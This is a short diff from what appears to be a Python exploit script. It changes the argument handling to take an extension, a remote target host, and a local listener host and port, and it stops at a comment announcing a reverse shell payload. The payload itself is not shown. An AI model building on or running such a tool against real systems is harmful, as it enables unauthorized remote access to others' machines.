@@ -16,14 +16,14 @@
 ############################################################
 import os,sys,urllib.request,urllib.parse,urllib.error
 
-if len(sys.argv) < 4:
-	print(("{} <rhost> <lhost> <lport>".format(sys.argv[0])))
+if len(sys.argv) < 5:
+	print(("{} <extension> <rhost> <lhost> <lport>".format(sys.argv[0])))
 	sys.exit(1)
 
-rhost=sys.argv[1]
-lhost=sys.argv[2]
-lport=sys.argv[3]
-extension="233"
+extension=sys.argv[1]
+rhost=sys.argv[2]
+lhost=sys.argv[3]
+lport=sys.argv[4]
 
 # Reverse shell payload
 
